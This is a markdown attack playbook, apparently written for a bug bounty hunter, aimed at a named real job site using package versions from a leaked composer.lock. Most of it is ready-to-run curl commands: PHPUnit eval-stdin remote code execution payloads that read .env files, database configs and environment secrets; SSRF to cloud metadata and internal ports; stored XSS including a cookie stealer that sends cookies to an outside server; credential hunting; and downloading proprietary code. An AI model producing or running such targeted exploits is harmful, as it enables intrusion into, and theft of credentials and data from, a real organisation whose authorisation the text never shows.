# ADDITIONAL COMPOSER-BASED ATTACK VECTORS
## Beyond PHPUnit RCE

Based on the leaked composer.lock from jobs.dnv.com, here are **ADDITIONAL** vulnerabilities you can test that go beyond the standard PHPUnit RCE:

---

## 🔥 1. ALGOLIA API KEY EXPOSURE (HIGH IMPACT)

**Package:** `algolia/algoliasearch-client-php: 2.8.0`

### Why This Matters:
Algolia is a search-as-a-service platform. If they're using it, there are likely **API keys exposed in JavaScript** that allow you to:
- Read all indexed data (possibly including PII)
- Modify search indices
- Access analytics data
- Potentially inject malicious results

### How to Find Keys:

```bash
# 1. Check homepage source for Algolia
curl -s "https://jobs.dnv.com/" | grep -i "algolia"

# 2. Check JavaScript files
curl -s "https://jobs.dnv.com/" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
    echo "Checking: $js"
    curl -s "https://jobs.dnv.com$js" 2>/dev/null | grep -i "algolia" -A 5 -B 5
done

# 3. Look for these patterns:
# - applicationId (app ID)
# - apiKey (search key)
# - searchOnlyApiKey

# 4. Extract keys
curl -s "https://jobs.dnv.com/" | grep -oP '(applicationId|apiKey|searchOnlyApiKey)["\047]?\s*:\s*["\047]\K[A-Za-z0-9]+'

# 5. Check common JavaScript paths
curl -s "https://jobs.dnv.com/application/themes/*/js/main.js"
curl -s "https://jobs.dnv.com/packages/*/js/*.js"
```

### If You Find Keys:

```bash
# Test the API key
APP_ID="FOUND_APP_ID"
API_KEY="FOUND_API_KEY"

# Query the index
curl -X POST \
  "https://${APP_ID}-dsn.algolia.net/1/indexes/*/queries" \
  -H "X-Algolia-Application-Id: ${APP_ID}" \
  -H "X-Algolia-API-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"requests":[{"indexName":"*","params":"query=*&hitsPerPage=100"}]}'

# List all indices
curl "https://${APP_ID}-dsn.algolia.net/1/indexes" \
  -H "X-Algolia-Application-Id: ${APP_ID}" \
  -H "X-Algolia-API-Key: ${API_KEY}"
```

**Impact:** Access to all search data (jobs, candidates, potentially PII)
**Bounty:** $2,000-$5,000

---

## 🔥 2. AWS CREDENTIALS IN SOURCE (CRITICAL)

**Package:** `aws/aws-sdk-php: 3.278.3`

### Why This Matters:
AWS SDK means they're using AWS services (S3, SES, etc.). Credentials might be:
- Hardcoded in config files
- Exposed in .env files
- Leaked in JavaScript for client-side S3 uploads

### How to Find:

```bash
# 1. Check for .env exposure
curl -s "https://jobs.dnv.com/.env"
curl -s "https://jobs.dnv.com/application/.env"
curl -s "https://jobs.dnv.com/concrete/.env"

# 2. Check for AWS credentials in source
curl -s "https://jobs.dnv.com/" | grep -i "aws_access_key\|aws_secret\|AKIA"

# 3. Check JavaScript for S3 presigned URLs or credentials
curl -s "https://jobs.dnv.com/" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
    curl -s "https://jobs.dnv.com$js" 2>/dev/null | grep -i "aws\|s3\|AKIA"
done

# 4. Try to read config via PHPUnit RCE (if you have it)
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("find . -name \"*.env\" -o -name \"aws.php\" 2>/dev/null"); ?>'

# 5. Check for S3 bucket names
curl -s "https://jobs.dnv.com/" | grep -oP 's3://[a-z0-9.-]+'
curl -s "https://jobs.dnv.com/" | grep -oP 'https://[a-z0-9.-]+\.s3\.amazonaws\.com'
```

### If You Find Bucket Names:

```bash
# Test bucket permissions
BUCKET="found-bucket-name"

# Try to list
aws s3 ls s3://$BUCKET/ --no-sign-request

# Try to download
aws s3 cp s3://$BUCKET/test.txt . --no-sign-request

# Check bucket ACL
curl -s "https://${BUCKET}.s3.amazonaws.com/?acl"
```

**Impact:** Data breach, AWS bill manipulation, infrastructure access
**Bounty:** $5,000-$20,000

---

## 🔥 3. PRIVATE GITLAB PACKAGE EXPOSURE (MEDIUM-HIGH)

**Package:** `thirtythree/c5-helpers: v3.2.3`
**Source:** `git@gitlab.thirtythreebuild.co.uk:thirtythree/c5-helpers.git`

### Why This Matters:
This is a **proprietary package** from a private GitLab. If the vendor directory is exposed, you can:
- Read proprietary source code
- Find hardcoded credentials
- Discover custom vulnerabilities
- Access business logic

### How to Exploit:

```bash
# 1. Try to access the package
curl "https://jobs.dnv.com/vendor/thirtythree/"
curl "https://jobs.dnv.com/vendor/thirtythree/c5-helpers/"

# 2. Try to download the package
curl "https://jobs.dnv.com/vendor/thirtythree/c5-helpers/src/" -O

# 3. List files
curl -s "https://jobs.dnv.com/vendor/thirtythree/c5-helpers/" | grep -oP 'href="[^"]+\.php"'

# 4. Read specific files
curl "https://jobs.dnv.com/vendor/thirtythree/c5-helpers/src/[filename].php"

# 5. Via PHPUnit RCE
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("find vendor/thirtythree -type f -name \"*.php\" | head -20"); ?>'

# Read a specific file
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php readfile("vendor/thirtythree/c5-helpers/src/SomeClass.php"); ?>'
```

### What to Look For in the Code:
- Database queries (SQL injection points)
- API calls (API keys)
- Authentication bypasses
- File upload handling (RCE vectors)
- Custom encryption (weak crypto)

**Impact:** Proprietary code disclosure, IP theft, additional vulnerabilities
**Bounty:** $1,000-$5,000

---

## 🔥 4. DOCTRINE CACHE POISONING (MEDIUM)

**Package:** `doctrine/cache: 1.13.0`

### Why This Matters:
If cache is accessible/predictable, you can:
- Poison cached data
- Bypass authentication
- Inject malicious content

### How to Test:

```bash
# 1. Check for exposed cache directories
curl "https://jobs.dnv.com/application/cache/"
curl "https://jobs.dnv.com/concrete/cache/"
curl "https://jobs.dnv.com/files/cache/"

# 2. Try to access cache files
curl "https://jobs.dnv.com/application/cache/expensive_expressions"

# 3. Via PHPUnit, list cache
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("find . -name \"cache\" -type d | head -10"); ?>'

# 4. Read cache files
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("find ./application/cache -type f | head -5 | xargs cat"); ?>'
```

**Impact:** Authentication bypass, data manipulation
**Bounty:** $500-$2,000

---

## 🔥 5. PARSEDOWN STORED XSS IN JOB LISTINGS (HIGH)

**Package:** `erusev/parsedown: 1.7.4`

### Why This Matters:
Jobs site likely allows:
- Employers to post job descriptions
- Job descriptions are rendered with Parsedown
- XSS can steal admin sessions

### How to Test:

```bash
# 1. Find job posting endpoints
curl -s "https://jobs.dnv.com/" | grep -i "post.*job\|create.*job\|add.*job"

# 2. Check if existing jobs have markdown
curl -s "https://jobs.dnv.com/jobs/some-job" | grep -i "markdown\|parsedown"

# 3. Test XSS payloads (need to be authenticated as employer)
# You'll need to register as an employer first

# Payload 1: CVE-2021-39152
[clickme]: (javascript:alert(document.domain))

[clickme]

# Payload 2: CVE-2022-39246
![<script>alert(document.cookie)</script>](x)

# Payload 3: More stealthy
![x](x onerror=alert(document.domain))

# Payload 4: Cookie stealer
![x](x onerror=fetch('https://your-server.com/?c='+document.cookie))
```

### Steps:
1. Register as employer (if possible)
2. Create job posting with XSS payload
3. Check if payload executes when admin reviews it
4. If yes → Stored XSS that can steal admin session

**Impact:** Admin account takeover, mass XSS
**Bounty:** $1,500-$4,000

---

## 🔥 6. GUZZLE SSRF VIA RSS FEEDS (HIGH)

**Package:** `guzzlehttp/guzzle: 6.5.8`

### Why This Matters:
Concrete CMS has RSS feed import. If Guzzle makes the requests, you can:
- SSRF to internal network
- Read AWS metadata
- Access internal services

### How to Test:

```bash
# 1. Find RSS import endpoint
# Concrete CMS typically has: /tools/required/blocks/rss/get_feed

# 2. Test basic SSRF
curl -X POST "https://jobs.dnv.com/tools/required/blocks/rss/get_feed" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://169.254.169.254/latest/meta-data/"

# 3. Try to read AWS metadata
curl -X POST "https://jobs.dnv.com/tools/required/blocks/rss/get_feed" \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 4. Port scanning internal network
for port in 22 80 443 3306 5432 6379 8080; do
    echo "Testing port $port"
    curl -X POST "https://jobs.dnv.com/tools/required/blocks/rss/get_feed" \
      -d "url=http://127.0.0.1:$port" \
      -w "Time: %{time_total}s\n"
done

# 5. Test header injection (CVE-2022-31090)
curl -X POST "https://jobs.dnv.com/tools/required/blocks/rss/get_feed" \
  -d "url=http://example.com%0d%0aX-Injected:header"
```

### Advanced: Blind SSRF Detection

```bash
# Use your own server to detect
YOUR_SERVER="your-burp-collaborator.com"

curl -X POST "https://jobs.dnv.com/tools/required/blocks/rss/get_feed" \
  -d "url=http://$YOUR_SERVER/test"

# Check your server logs for incoming request
```

**Impact:** Internal network access, AWS metadata, credential theft
**Bounty:** $2,000-$7,000

---

## 🔥 7. SYMFON Y DEBUG MODE EXPOSURE (LOW-MEDIUM)

**Package:** `symfony/*: v3.4.47`

### How to Test:

```bash
# 1. Check for debug mode
curl -s "https://jobs.dnv.com/" | grep -i "symfony\|profiler"

# 2. Try to access profiler
curl "https://jobs.dnv.com/_profiler/"
curl "https://jobs.dnv.com/app_dev.php"

# 3. Check headers for debug info
curl -I "https://jobs.dnv.com/" | grep -i "x-debug\|x-symfony"

# 4. Trigger an error to see stack trace
curl "https://jobs.dnv.com/nonexistent-page-12345"

# 5. Test cache poisoning (CVE-2020-15094)
curl "https://jobs.dnv.com/" \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Forwarded-Proto: https"

# Check if response contains evil.com in links/redirects
```

**Impact:** Information disclosure, cache poisoning
**Bounty:** $300-$1,500

---

## 🎯 COMPLETE TESTING WORKFLOW

### Step 1: Run the Comprehensive Script

```bash
chmod +x COMPREHENSIVE_COMPOSER_EXPLOIT.sh
./COMPREHENSIVE_COMPOSER_EXPLOIT.sh
```

### Step 2: Manual Tests (If RCE Found)

If PHPUnit RCE works, use it to:

```bash
# Read all config files
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php
system("find . -maxdepth 5 -name \"*.php\" | grep config | xargs grep -l \"password\\|secret\\|key\" ");
?>'

# Read database config
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php
@readfile("application/config/database.php");
?>'

# Check for .env
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php
system("find . -maxdepth 3 -name \".env\" | xargs cat");
?>'

# List all vendor packages
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php
system("ls -la vendor/");
?>'

# Get environment variables (might contain AWS creds)
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php
system("printenv | grep -i \"aws\\|key\\|secret\\|pass\"");
?>'
```

### Step 3: Document Everything

Save all findings with:
- Screenshots
- HTTP requests/responses
- Proof of impact
- Steps to reproduce

---

## 💰 BOUNTY ESTIMATES (Combined)

| Finding | Severity | Bounty |
|---------|----------|--------|
| PHPUnit RCE | CRITICAL | $5,000-$15,000 |
| AWS Credentials | CRITICAL | $5,000-$20,000 |
| Database Config | CRITICAL | $3,000-$10,000 |
| Algolia API Keys | HIGH | $2,000-$5,000 |
| SSRF via Guzzle | HIGH | $2,000-$7,000 |
| Stored XSS (Parsedown) | HIGH | $1,500-$4,000 |
| Private Package Exposure | MEDIUM | $1,000-$5,000 |
| Twig SSTI | HIGH | $2,000-$5,000 |

**Total Potential:** $21,500-$71,000

---

## ⚠️ TESTING ORDER (By Impact)

1. **PHPUnit RCE** (5 min) → If this works, you WIN
2. **Database Config** (via RCE) → CRITICAL if exposed
3. **AWS Credentials** (10 min) → Check .env, JS, config
4. **Algolia Keys** (15 min) → Check JavaScript files
5. **SSRF** (20 min) → Test RSS feeds, webhooks
6. **Stored XSS** (30 min) → Register employer, test markdown
7. **Private Package** (10 min) → Download proprietary code
8. **Twig SSTI** (20 min) → Test template injection

---

## 🚀 RUN THIS NOW

```bash
# Quick win test
curl "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"

# If HTTP 200:
curl -X POST "https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("id"); ?>'

# If you see "uid=..." → YOU HAVE RCE → REPORT IMMEDIATELY
```

Good luck! 🎯
